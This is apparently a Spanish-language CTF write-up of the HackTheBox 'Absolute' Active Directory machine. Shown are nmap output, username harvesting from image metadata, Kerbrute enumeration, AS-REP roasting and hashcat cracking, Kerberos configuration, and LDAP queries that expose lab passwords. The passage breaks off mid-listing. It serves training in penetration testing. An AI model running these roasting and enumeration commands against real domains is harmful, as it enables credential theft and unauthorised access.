---
title: "HackTheBox: Absolute Write-Up en español"
author: ace
date: 2023-11-08 19:10 +0800
categories:
  - HTB
  - Insane
  - Windows
tags:
  - ActiveDirectory
  - Kerberos
  - AS-RepRoast
  - Windows
  - impacket
  - whisker
  - rubeus
  - certipy
  - krbrelay
  - dacledit
  - AC-DS
  - Pass-The-Hash
  -DCSync
math: false
mermaid: true
image:
  path: https://www.ngi.es/wp-content/uploads/2021/05/kerberos-windows.png
  lqip: data:image/webp;base64,UklGRpoAAABXRUJQVlA4WAoAAAAQAAAADwAABwAAQUxQSDIAAAARL0AmbZurmr57yyIiqE8oiG0bejIYEQTgqiDA9vqnsUSI6H+oAERp2HZ65qP/VIAWAFZQOCBCAAAA8AEAnQEqEAAIAAVAfCWkAALp8sF8rgRgAP7o9FDvMCkMde9PK7euH5M1m6VWoDXf2FkP3BqV0ZYbO6NA/VFIAAAA
  alt: Absolute
---


|Box info|
|-----|
|**Hostname**| Absolute |
|**OS**| Windows |
|**Difficulty**| Insane |
|**Platform**| HackTheBox|

## Resumen

Absolute es una máquina enfocada en Kerberos, ya que este método de autenticación en AD desempeña un papel crucial para su resolución. A pesar de su dificultad, especialmente si no estás familiarizado con Kerberos, la máquina se vuelve más sencilla a medida que adquieres aprendes a como usar Kerbrute, al menos en su primera fase.

La temática que tocar esta máquina es la siguiente:

- Enumeración de metadatos en imágenes.
- Uso de **Username-Anarchy** para generar una wordlist que contenga posibles nombres de usuario
- Ataque `AS-REP Roast`.
- Autenticación a través de Kerberos.
- Enumeración manual en Active Directory usando Kerberos.
- Bloodhound.
- Análisis dinámico de un binario compilado en Nim con Wireshark.
- Manipulación de DACLs con `PowerView` y `dacl.py`
- `Shadow Credentials Attack` con `certipy` y `Whisker`
- Uso de `KrbRelayUp` para elevar privilegios.

Dicho esto vamos al lío.

## nmap

```ruby
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-title: Absolute
| http-methods: 
|_  Potentially risky methods: TRACE
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2023-11-05 19:18:39Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: absolute.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc.absolute.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc.absolute.htb
| Not valid before: 2023-07-17T21:11:52
|_Not valid after:  2024-07-16T21:11:52
|_ssl-date: 2023-11-05T19:19:45+00:00; +7h00m01s from scanner time.
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: absolute.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2023-11-05T19:19:44+00:00; +7h00m00s from scanner time.
| ssl-cert: Subject: commonName=dc.absolute.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc.absolute.htb
| Not valid before: 2023-07-17T21:11:52
|_Not valid after:  2024-07-16T21:11:52
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: absolute.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2023-11-05T19:19:45+00:00; +7h00m01s from scanner time.
| ssl-cert: Subject: commonName=dc.absolute.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc.absolute.htb
| Not valid before: 2023-07-17T21:11:52
|_Not valid after:  2024-07-16T21:11:52
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: absolute.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc.absolute.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc.absolute.htb
| Not valid before: 2023-07-17T21:11:52
|_Not valid after:  2024-07-16T21:11:52
|_ssl-date: 2023-11-05T19:19:44+00:00; +7h00m00s from scanner time.
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49673/tcp open  msrpc         Microsoft Windows RPC
49674/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49675/tcp open  msrpc         Microsoft Windows RPC
49684/tcp open  msrpc         Microsoft Windows RPC
49691/tcp open  msrpc         Microsoft Windows RPC
49701/tcp open  msrpc         Microsoft Windows RPC
49715/tcp open  msrpc         Microsoft Windows RPC
49716/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 7h00m00s, deviation: 0s, median: 7h00m00s
| smb2-time: 
|   date: 2023-11-05T19:19:37
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required

```
{: .nolineno }

## Recon

A primera vista, podemos observar que los puertos (53, 88, 389) correspondientes a DNS, Kerberos y LDAP están abiertos, lo cual ya es un indicador claro de que nos encontramos frente a un controlador de dominio. También por SMB y LDAP, se filtra el hostname de la máquina. En un entorno de AD, aconsejo modificar el fichero `hosts` con la siguiente estructura:

```bash
10.129.142.54   dc.absolute.htb absolute.htb
```
Es importante poner primero el hostname para evitar problemas a futuro con Kerberos.

### LDAP: 389, 3269

En el resultado de nmap, vemos que LDAP, esta configurado con SSL. Si inpeccionamos el certificado podremos ver en el Common Name, `DC-CA`, esto quiere decir que existe una entidad certificadora en la máquina, de lo cual nos vamos a aprovechar más tarde para ganar acceso.

```bash
❯ openssl s_client -connect 10.129.142.54:3269 < /dev/null > /dev/null | openssl x509 -noout -text
Cant use SSL_get_servername
depth=0 CN = dc.absolute.htb
verify error:num=20:unable to get local issuer certificate
verify return:1
depth=0 CN = dc.absolute.htb
verify error:num=21:unable to verify the first certificate
verify return:1
depth=0 CN = dc.absolute.htb
verify return:1
DONE
Certificate:
    Data:
        Version: 3 (0x2)
        Serial Number:
            6e:00:00:00:04:4c:07:8a:56:d2:51:0b:05:00:01:00:00:00:04
        Signature Algorithm: sha1WithRSAEncryption
        Issuer: DC = htb, DC = absolute, CN = absolute-DC-CA
        Validity
            Not Before: Jul 17 21:11:52 2023 GMT
            Not After : Jul 16 21:11:52 2024 GMT
        Subject: CN = dc.absolute.htb
        Subject Public Key Info:
            Public Key Algorithm: rsaEncryption
                Public-Key: (2048 bit)
                Modulus:
                    00:c9:c3:5d:9d:39:dd:0f:1a:f3:93:54:b2:a9:47:
                    04:d9:9f:fb:79:a5:54:fe:a3:f3:a0:dc:74:1c:e0:
                    06:0c:05:e2:d9:36:70:b1:91:ed:59:fb:07:af:cc:
                    6d:c4:ef:da:a6:dd:ac:12:f5:64:d9:51:0d:df:7f:
                    61:1a:a6:d3:25:4d:f5:b8:a2:d2:81:c5:55:09:87:
                    28:02:37:ab:a1:db:ff:1a:d2:7c:fb:8b:b3:3d:ab:
                    f2:7c:ad:8a:38:3b:4c:e3:18:2e:df:30:23:39:e9:
                    ef:24:e9:92:6e:21:d1:4b:73:04:27:aa:57:0e:03:
                    a0:61:e2:e4:ed:3b:a3:11:7e:72:7a:80:16:48:09:
                    64:6b:a4:ae:8f:f9:51:54:cc:da:86:f3:3c:28:d3:
                    f2:1d:b7:6e:27:89:ac:cf:61:f2:da:e2:65:5e:75:
                    85:5d:a1:2d:fb:fc:6e:88:1b:7f:6d:bf:82:f7:6a:
                    f9:4b:11:a8:04:20:89:4a:7b:91:fb:d0:ad:ad:ef:
                    3d:f7:0c:1a:32:53:82:c0:1f:d0:fe:94:51:6a:cc:
                    91:40:f0:93:38:de:eb:08:f4:2f:7f:1d:b7:fe:d4:
                    9f:36:03:7d:36:b2:6a:49:55:d2:bd:f1:2f:f6:16:
                    fc:f7:4c:88:7d:92:00:9e:2a:7e:e6:0c:ca:a0:1a:
                    1a:8d
                Exponent: 65537 (0x10001)
        X509v3 extensions:
            1.3.6.1.4.1.311.20.2: 
                . .D.o.m.a.i.n.C.o.n.t.r.o.l.l.e.r
            X509v3 Extended Key Usage: 
                TLS Web Client Authentication, TLS Web Server Authentication
            X509v3 Key Usage: critical
                Digital Signature, Key Encipherment
            S/MIME Capabilities: 
......0...`.H.e...*0...`.H.e...-0...`.H.e....0...`.H.e....0...+....0
..*.H..
            X509v3 Subject Key Identifier: 
                21:EA:6B:5C:42:36:65:79:74:58:3B:EA:47:59:25:50:46:4A:02:61
            X509v3 Authority Key Identifier: 
                80:86:20:4F:E0:C3:6F:4A:F8:42:66:90:8B:3F:5F:50:3B:DD:A0:37
            X509v3 CRL Distribution Points: 
                Full Name:
                  URI:ldap:///CN=absolute-DC-CA,CN=dc,CN=CDP,CN=Public%20Key%20Services,CN=Services,CN=Configuration,DC=absolute,DC=htb?certificateRevocationList?base?objectClass=cRLDistributionPoint
            Authority Information Access: 
                CA Issuers - URI:ldap:///CN=absolute-DC-CA,CN=AIA,CN=Public%20Key%20Services,CN=Services,CN=Configuration,DC=absolute,DC=htb?cACertificate?base?objectClass=certificationAuthority
            X509v3 Subject Alternative Name: 
                othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc.absolute.htb
            1.3.6.1.4.1.311.25.2: 
                0@.>.
+.....7....0..S-1-5-21-4078382237-1492182817-2568127209-1000
    Signature Algorithm: sha1WithRSAEncryption
    Signature Value:
        27:e4:9a:2b:e2:ef:d1:b0:ad:ad:18:90:38:7e:61:5f:a6:78:
        25:95:b1:b1:08:a8:7e:8a:c4:64:02:1d:06:b3:b5:ed:30:ee:
        8d:a1:2c:46:43:6d:34:89:9d:00:61:9c:7e:e3:36:9d:63:03:
        54:bd:a3:ef:39:7a:50:b0:6c:00:9e:57:0f:38:e3:dc:a4:fb:
        6a:0c:e2:90:92:cf:0e:8f:4c:22:e8:8d:c9:5f:72:10:78:69:
        e9:f1:9e:63:3c:d3:63:df:f8:62:8b:82:81:9f:fa:95:b6:20:
        d2:9e:e5:f4:5a:bd:46:5b:04:25:08:30:43:f7:18:2e:a9:58:
        a8:80:ad:32:80:6e:d2:93:14:70:5a:8e:5d:75:78:c3:53:86:
        cd:1d:77:8a:98:b2:e7:53:7a:9a:08:52:ab:67:3f:e1:6f:5f:
        7e:df:25:79:0b:f2:95:d5:c3:00:5b:7b:d9:cb:1c:35:82:a2:
        56:31:21:5d:17:8c:33:f8:12:e2:e7:13:99:c7:08:73:c9:76:
        bd:8d:d8:e8:76:71:a5:47:66:61:14:58:9c:a5:0d:85:43:28:
        09:1b:43:d1:d4:f2:22:33:2e:85:fe:e8:81:8a:da:69:67:84:
        55:e3:02:91:a1:b6:5f:10:b1:25:19:1e:c5:71:32:0c:29:7b:
        13:41:f1:a4

```
{: .nolineno }
### Web 80 - TCP

Para ir directo al grano, no tenemos acceso a una sesión de invitado para enumerar recursos a través de SMB, no podemos conectarnos al DC mediante rpcclient, no podemos realizar querys por LDAP para enumerar usuarios o información del dominio, ni tampoco enumerar subdominios a través de ataques AXFR. En cuanto al servidor web, se trata de un IIS que almacena una página estática. Después de ejecutar Gobuster, no he encontrado nada de interés, como archivos PHP o ASPX. Sin embargo, podemos obtener información de las imágenes almacenadas en la carpeta '/images'. Descargaremos estas imágenes a nuestra máquina local para analizar posteriormente los metadatos.

```bash
wget -r http://absolute.htb/images
```
{: .nolineno }

#### ExifTool: Extrayendo metadatos

Para analizar los metadatos de las imágenes, utilizaré ExifTool y filtraré por el campo 'Author' con el fin de obtener, si está disponible, el nombre de usuario que creó la imagen. En este caso, uso un `*` para que el comando se aplique a todos los archivos PNG y me lo redirija a un fichero de texto. El comando es el siguiente:

```bash
❯ exiftool *.jpg | grep -i "Author" | awk '{print $2}' FS=':' | sed 's/^ //g' | tee -a usernames.txt
James Roberts
Michael Chaffrey
Donald Klay
Sarah Osvald
Jeffer Robinson
Nicole Smith
```
{: .nolineno }

Ahora que tenemos una lista de posibles usuarios, hemos dado un paso valioso en un entorno de Active Directory (AD). Generalmente, la estructura de los nombres de usuario depende del dominio y suele seguir patrones como inicial, apellido, inicial.apellido, inicial_apellido, entre otros. Para simplificar la generación de posibles nombres de usuario, existe una herramienta escrita en Ruby llamada **Username-Anarchy**. Esta herramienta toma un archivo de texto correctamente formateado y genera una lista de posibles nombres de usuario. Puedes encontrarla en el siguiente repositorio: [Usename-Anarchy](https://github.com/urbanadventurer/username-anarchy).

El siguiente paso consiste en formatear el archivo de manera que **Username-Anarchy** pueda entenderlo, lo cual suele ser en el formato 'nombre,apellido'. Con el editor de texto **vi** se puede realizar ejecutando la siguiente instrucción:

```
:%s/ /,/g
```

El fichero final es el siguiente:

```bash
❯ cat usernames.txt
firstname,lastname
James,Roberts
Michael,Chaffrey
Nicole,Smith
Donald,Klay
Jeffer,Robinson
Sarah,Osvald
```
{: .nolineno }
Ejecutamos **Username-Anarchy** y obtenemos un archivo de texto con los posibles nombres de usuario. Luego, utilizamos **sponge** para sobrescribir el archivo sin la necesidad de redirigirlo a uno temporal o realizar pasos adicionales

```bash
❯ /opt/username-anarchy/username-anarchy -i usernames.txt -f flast,f.last | sponge usernames.txt
❯ cat usernames.txt
j.roberts
jroberts
m.chaffrey
mchaffrey
n.smith
nsmith
d.klay
dklay
j.robinson
jrobinson
s.osvald
sosvald
```
{: .nolineno }

### User Enumeration: Kerbrute

En Active Directory, el primer paso comúnmente realizado cuando se dispone de una lista de posibles usuarios del dominio es utilizar **Kerbrute** para comprobar si son válidos o no. Esto se puede comprobar debido al funcionamiento de Kerberos. Cuando se envía una solicitud `AS_REQ` para obtener un TGT (Ticket Granting Ticket), si el usuario no es válido, el KDC responde con un mensaje de `PRINCIPAL_UNKNOWN`, indicando que el usuario no se encuentra en la base de datos de Kerberos. Por otro lado, si el usuario es válido, Kerberos responderá con un mensaje de 'invalid credentials' u otra respuesta similar. De ahí viene el ataque `AS-REP Roast`, que vermos más adelante. 

```
❯ /opt/kerbrute/kerbrute userenum -dc dc.absolute.htb -d absolute.htb usernames.txt

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: dev (n/a) - 11/05/23 - Ronnie Flathers @ropnop

2023/11/05 13:40:41 >  Using KDC(s):
2023/11/05 13:40:41 >  	dc.absolute.htb:88

2023/11/05 13:40:41 >  [+] VALID USERNAME:	m.chaffrey@absolute.htb
2023/11/05 13:40:41 >  [+] VALID USERNAME:	j.roberts@absolute.htb
2023/11/05 13:40:41 >  [+] VALID USERNAME:	n.smith@absolute.htb
2023/11/05 13:40:41 >  [+] VALID USERNAME:	j.robinson@absolute.htb
2023/11/05 13:40:41 >  [+] VALID USERNAME:	s.osvald@absolute.htb
2023/11/05 13:40:41 >  [+] d.klay has no pre auth required. Dumping hash to crack offline:
$krb5asrep$18$d.klay@ABSOLUTE.HTB:fc3b115409207e3dc0d7b4e5bcecb3e0$021ba373ad154f0094c1b0908033c3b55eeb99fd9d3b5e4969131490b2519ee1790022539cfc3cdd387e0f1e2948dc2614346915b61c74406a9aa42d15c7c10005a21bcc7ac0872b30a7d2d2cc4c3bf83a64e4a869dbcf8a680a6519c8026ad46e45dc20a3ac4ea011627bf8e4b395426cbf3ad36cb281b4be13f5c744e60aace854ea155cb02788df60d89660705997c6b4e3d9b715d9f8443466a55ab157366814e01ee36b32306cd41b229bb7a1a7f22acaa30804c13e4cd9d418d8dc93e26f01e13dfd20c69afe4049af9c8f9780c4a4768729be3e3b85c2c38f6371f1943e49f155983fadbe0e69f104927b4d2c381a9ae451bc131b20e6a43c141b0f48
2023/11/05 13:40:41 >  [+] VALID USERNAME:	d.klay@absolute.htb
2023/11/05 13:40:41 >  Done! Tested 24 usernames (6 valid) in 0.214 seconds
```

Tras ejecutar Kerbrute, observamos un listado de usuarios válidos, y notamos que `d.klay` es vulnerable al ataque `AS-REP roast`. La última versión de Kerbrute realiza un AS-REP roast directamente para obtener el Ticket Granting Ticket (TGT) del usuario vulnerable. La vulnerabilidad de este usuario radica en su configuración, que tiene la opción `DONT_REQUIRE_PREAUTH` habilitada. Esto significa que no requiere autenticación previa de Kerberos, lo que permite que el `KDC` devuelva el TGT con la contraseña del usuario encriptada.

Guardamos los usuarios válidos en un fichero.

```bash
❯ cat usernames.txt
m.chaffrey
j.roberts
n.smith
j.robinson
s.osvald
d.klay
```
{: .nolineno }
### AS-REP Roast Attack

Por defecto, el valor ETYPE que Kerbrute muestra en su salida es el 18, mientras que el modo utilizado para crackear los hashes en Hashcat es el ETYPE 23. Debido a esta diferencia de formato, no será posible crackear el hash, ya que no coincide con el requerido por Hashcat. Para obtener el hash en un formato que hashcat entienda podemos hacer lo siguiente

Usar `impacket-GetNPUsers`:

```bash
❯ impacket-GetNPUsers -dc-ip 10.129.68.75 -no-pass -request 'absolute.htb/d.klay'
Impacket v0.11.0 - Copyright 2023 Fortra

[*] Getting TGT for d.klay
$krb5asrep$23$d.klay@ABSOLUTE.HTB:7f20e46062a600c2be20601c64f7a964$01cc50aef8801b01616870c0a0a5e5aff9a3c47b6173af9d62c96a81d352da28c74871a959c5e4b8ab7b055cfb991a3d67f70895c676fc47ec668f6aa0850ca3ca81d62c8d6e27e3fcb19e1716106fa012b31c755bd912f71160b1f12e257035577ac26caf476ee9c9734209e3f43b1303b25814f63caf1c2ab4e6d3f4316bafd1589d03b91625834987f71cc669872d66aaf06bb568ec5e1ca960cccca9199a43c8dca79cca058f38cc93c76e0123d9f59abd5158f018e8edd2253f73d657f5e5e2f2f7498d0840e8dc9775826e9f5b3d3652f227b7719ac0c2f5b456e7e4ab52cfb135b65f7fc7265ae845
```
{: .nolineno }
Con kerbrute usar la flag `--downgrade`:

```
❯ /opt/kerbrute/kerbrute userenum --dc dc.absolute.htb -d absolute.htb users.txt --downgrade

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: dev (n/a) - 11/07/23 - Ronnie Flathers @ropnop

2023/11/07 00:17:46 >  Using downgraded encryption: arcfour-hmac-md5
2023/11/07 00:17:46 >  Using KDC(s):
2023/11/07 00:17:46 >  	dc.absolute.htb:88
...
...
2023/11/07 00:17:46 >  [+] d.klay has no pre auth required. Dumping hash to crack offline:
$krb5asrep$23$d.klay@ABSOLUTE.HTB:8d5712913aac4c62eda2d5c1d791c48e$541a1a48c6ee608182959fcf33c373961e6ab54a46ac1b256f5b59a10e695863603034716c8c5b684788c7e80e0dd76d376ea36b96e945ef8cb345dc878afd91dd9539a4896f9b44a572a10bdbc2ac335b55ccde0e7e4dd27fdf6de91700eaafee3a892a5c45eb6f23e9e2630f279118ac6b15d508b5e7dba58c1668faba647e2428aff68d812a26ac1c6c506617a78caec11fdb1d727b3dcf0773b7b303638101ba6adc8221a67d2d7ab4d86b6835380842c64f2159950bd9e99c3d6c4de0e927535a86fdae38560eabf69d800cd871e8628cd5438084bdceacbaa378bc62fd33f7553a4521f711f5878bed
2023/11/07 00:17:46 >  [+] VALID USERNAME:	d.klay@absolute.htb
```

Una vez tenemos el hash, lo crackeamos usando `hashcat`

```bash
❯ hashcat -m 18200 -a 0 d.klay.asrep /usr/share/wordlists/rockyou.txt --force
hashcat (v6.2.6) starting

You have enabled --force to bypass dangerous warnings and errors!
This can hide serious problems and should only be done when debugging.
Do not report hashcat issues encountered when using --force.

OpenCL API (OpenCL 3.0 PoCL 4.0+debian  Linux, None+Asserts, RELOC, SPIR, LLVM 15.0.7, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
==================================================================================================================================================
* Device #1: cpu-haswell-Intel(R) Core(TM) i7-5775C CPU @ 3.30GHz, 6921/13906 MB (2048 MB allocatable), 8MCU

```
{: .nolineno }
```bash
$krb5asrep$23$d.klay@ABSOLUTE.HTB:7dcc8ee944cbd8d9acffd5e52e051762$6f4acb9b53597e032fa24da7f8c4ac8c4f66e92394b5512c9702841ac64f134052687e40aa5beb40a7977ecd1b0b91e1b90fbfef6ede949050627e5d43ff2a4a4c1ee7f4cee2df7c3534c4a4fb674a5863f170414049ac2b2d95e4cda2679bfab591c205f1b6f3a942432e4d74f68350cb6300cf90309c1ca714e1ec0520b2058ac5199b5056a8319869eab3aedc35688b1cd3911dc0e2c071fe6e1da57040497021ddd2e2bdaec6544bedf696dd2eb0d7df0b5f1bf3a90846939dfc93322c58fd42b6c05303436f81c870b7847481c033112905c1f6d316c78cd439fb52f10d9381e1c8c0804c2e4be542c8:Darkmoonsky248girl
```
{: .nolineno }
Tras conseguir obtener la contraseña del usuario `d.klay` en texto plano, voy a validarla usando `crackmapexec`, y obtenemos el siguiente resultado:

```bash
❯ cme smb 10.129.68.75 -u 'd.klay' -p 'Darkmoonsky248girl' 
SMB         10.129.68.75    445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:absolute.htb) (signing:True) (SMBv1:False)
SMB         10.129.68.75    445    DC               [-] absolute.htb\d.klay:Darkmoonsky248girl STATUS_ACCOUNT_RESTRICTION 
```
{: .nolineno }
Parece ser que `crackmapexec` realiza la autenticación mediante `NTLM`. Puede que el administrador del dominio haya deshabilitado este tipo de autenticación para usuarios no privilegiados, ya que de esta manera se evitan los ataques `Pass-The-Hash`.

Pero al disponer de la contraseña, voy a autenticarme usando `Kerberos`.

```bash
❯ cme smb 10.129.68.75 -u 'd.klay' -p 'Darkmoonsky248girl' -k
SMB         10.129.68.75    445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:absolute.htb) (signing:True) (SMBv1:False)
SMB         10.129.68.75    445    DC               [-] absolute.htb\d.klay: KRB_AP_ERR_SKEW
```
{: .nolineno }
Vemos el siguiente error `KRB_AP_ERR_SKEW`. Esto ocurre porque no tenemos sincronizados la hora de nuestra máquina de atacante con el reloj del DC. Para evitar problemas con Kerberos siempre es recomendable tener síncronizada la hora.
### Sincronizando el reloj con el DC.

Para sincronizarlo podemos usar la herramienta `ntpdate`, aunque en mi caso tuve que realizar una configuración extra:

```bash
❯ sudo ntpdate 10.129.68.75
2023-11-05 22:19:23.24649 (+0100) +25200.798573 +/- 0.025121 10.129.68.75 s1 no-leap
CLOCK: time stepped by 25200.798573
```
{: .nolineno }
Aunque ejecute este comando, el reloj no se síncroniza y esto en mi caso concreto se debía a que el demonio `systemd-timesyncd` estaba ejecutandose. Este demonio se utiliza para sincronizar el reloj del sistema a través de la red, lo cual causaba conficto con `ntpdate`. Para evitar errores simplemente deshabilito el servicio, y ya puedo sincronizarme al DC.

```bash
❯ systemctl stop systemd-timesyncd.service
==== AUTHENTICATING FOR org.freedesktop.systemd1.manage-units ====
Authentication is required to stop 'systemd-timesyncd.service'.
Authenticating as: alex,,, (alex)
Password: 
==== AUTHENTICATION COMPLETE ====
❯ sudo ntpdate dc.absolute.htb
2023-11-05 22:28:00.484487 (+0100) +252
```
{: .nolineno }
Nos autenticamos por Kerberos, y ahora podemos comprobar que las credenciales son correctas.

```bash
❯ cme smb 10.129.68.75 -u 'd.klay' -p 'Darkmoonsky248girl' -k
SMB         10.129.68.75    445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:absolute.htb) (signing:True) (SMBv1:False)
SMB         10.129.68.75    445    DC               [+] absolute.htb\d.klay:Darkmoonsky248girl 
```
{: .nolineno }
### Usando Kerberos como método de autenticación

Bien ya que disponemos de credenciales válidas, si queremos autenticarnos en el dominio para empezar a enumerar, lo tenemos que hacer usando Kerberos obligatoriamente. Esto puede ser un dolor de cabeza al principio por que la mayoría de scripts usados para enumerar AD, usan `NTLM` por defecto. 

Por ejemplo voy a conectarme por `rpcclient` al DC, usando las credenciales de `d.klay`

```bash
❯ rpcclient -U 'absolute.htb\d.klay%Darkmoonsky248girl' 10.129.68.75
Cannot connect to server.  Error was NT_STATUS_ACCOUNT_RESTRICTION
```
{: .nolineno }
El siguiente mensaje indica que la autenticación NTLM está desactivada. En cambió si lo hago con Kerberos, la cosa cambia.

```bash
❯ rpcclient -U 'absolute.htb\d.klay%Darkmoonsky248girl' 10.129.68.75 --use-kerberos=required
Kerberos auth with 'd.klay@ABSOLUTE.HTB' (ABSOLUTE.HTB\d.klay) to access '10.129.68.75' not possible
Cannot connect to server.  Error was NT_STATUS_ACCESS_DENIED
```
{: .nolineno }
No podemos conectarnos pero simplemente porque no tenemos permisos xD

Ahora bien ¿Como utilizo Kerberos, como método de autenticación?

Pues es necesario contar con el paquete `krb5-user` instalado y configurar el fichero `/etc/krb5.conf` indicado la información del dominio al que nos vamos a conectar. Debe tener la siguiente estructura:

```bash
[libdefaults]
    default_realm = ABSOLUTE.HTB


[realms]
    ABSOLUTE.HTB= {
        kdc = dc.absolute.htb
        admin_server = dc.absolute.htb
        default_domain = absolute.htb

    }

[domain_realm]
    .absolute.htb = ABSOLUTE.HTB
    absolute.htb
```

Una vez esto vamos a iniciar sesión como `d.klay` usando el comando `kinit`

```bash
❯ kinit d.klay
Password for d.klay@ABSOLUTE.HTB:
```
{: .nolineno }
No vemos ningún output lo cual quiere decir que disponemos de una sesión como `d.klay`. Podemos listar los tickets almacenados en memoria con `klist`

```bash
❯ klist
Ticket cache: FILE:/tmp/krb5cc_1000
Default principal: d.klay@ABSOLUTE.HTB

Valid starting     Expires            Service principal
11/07/23 02:50:44  11/07/23 06:50:44  krbtgt/ABSOLUTE.HTB@ABSOLUTE.HTB
	renew until 11/07/23 06:50:44
11/07/23 02:51:18  11/07/23 06:50:44  ldap/dc.absolute.htb@ABSOLUTE.HTB
	renew until 11/07/23 06:50:44
```
{: .nolineno }
Bien ahora que podemos usar Kerberos como método de autenticación vamos a enumerar el dominio autenticados.

> También puedes usar **impacket** junto con el script **getTGT**. Este script crea un archivo **.ccache** que contiene el ticket de autenticación del usuario. Para utilizar esas credenciales, debes cambiar una variable de entorno llamada **KRB5CCNAME** para que apunte a ese archivo y, a partir de ahí, puedes autenticarte en el dominio. Para mí esta opción es un poco coñazo, ya que si cambias de pestaña en la terminal o se te olvida exportar la variable de entorno, perderás la autenticación. 
{: .prompt-info }

## Enumeración del dominio

Para mí la mejor opción para enumerar el dominio, es con `bloodhound`. Se puede ir haciendo manualmente con herramietas como `PowerView`, `ldapsearh`, `rpcclient`, etc... Pero a fin de cuentas la manera en la que `Bloodhound`, representa la información me parece más clara y la que mejor refleja la vía para escalar privilegios dentro del dominio. Dicho esto si queremos saber una información concreta, como por ejemplo a que grupo pertenece un usuario o enumerar los recursos compartidos por SMB, pues sí que es más rentable usar estas herramientas. Por ejemplo en este caso uso `ldapsearch` para sacar los usuarios del dominio. 

>Para usar la autenticación por que kerberos con **ldapseach** debemos tener instalado el paquete **libsasl2-modules-gssapi-mit** e indicar la flag **-Y GSSAPI** 
{: .prompt-warning }

```bash
❯ ldapsearch -H ldap://dc.absolute.htb -Y GSSAPI -b "DC=absolute,DC=htb" "objectclass=user" | grep "name" | awk '{print $2}'
SASL/GSSAPI authentication started
SASL username: d.klay@ABSOLUTE.HTB
SASL SSF: 256
SASL data security layer installed.
Administrator
Guest
DC
krbtgt
J.Roberts
M.Chaffrey
D.Klay
s.osvald
j.robinson
n.smith
m.lovegod
l.moore
c.colt
s.johnson
d.lemm
svc_smb
svc_audit
winrm_user
```
{: .nolineno }
También podríamos enumerar sus descripciones, ya que es común que en entornos CTF, se pueda obtener información como contraseñas.

```bash
❯ ldapsearch -H ldap://dc.absolute.htb -Y GSSAPI -b "DC=absolute,DC=htb" "objectClass=User" name description | grep -E "(description|name)"
SASL/GSSAPI authentication started
SASL username: d.klay@ABSOLUTE.HTB
SASL SSF: 256
SASL data security layer installed.
# requesting: name description 
description: Built-in account for administering the computer/domain
name: Administrator
description: Built-in account for guest access to the computer/domain
name: Guest
name: DC
description: Key Distribution Center Service Account
name: krbtgt
name: J.Roberts
name: M.Chaffrey
name: D.Klay
name: s.osvald
name: j.robinson
name: n.smith
name: m.lovegod
name: l.moore
name: c.colt
name: s.johnson
name: d.lemm
description: AbsoluteSMBService123!
name: svc_smb
name: svc_audit
description: Used to perform simple network tasks
name: winrm_user
```
{: .nolineno }
Como se puede observar en la descripcción de un usuario se puede ver la string `AbsoluteSMBService123!`, que tiene todas las papeletas de ser una contraseña.

Con `crackmapexec` es más sencillo tambíen lo podemos hacer y es mas legible la información:

```bash
❯ cme ldap 10.129.229.59 -u 'm.lovegod' -p 'AbsoluteLDAP2022!' -k --users
SMB         10.129.229.59   445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:absolute.htb) (signing:True) (SMBv1:False)
LDAP        10.129.229.59   389    DC               [+] absolute.htb\m.lovegod:AbsoluteLDAP2022! 
LDAP        10.129.229.59   389    DC               [*] Total of records returned 20
LDAP        10.129.229.59   389    DC               Administrator                  Built-in account for administering the computer/domain
LDAP        10.129.229.59   389    DC               Guest                          Built-in account for guest access to the computer/domain
LDAP        10.129.229.59   389    DC               krbtgt                         Key Distribution Center Service Account
LDAP        10.129.229.59   389    DC               J.Roberts                      
LDAP        10.129.229.59   389    DC               M.Chaffrey                     
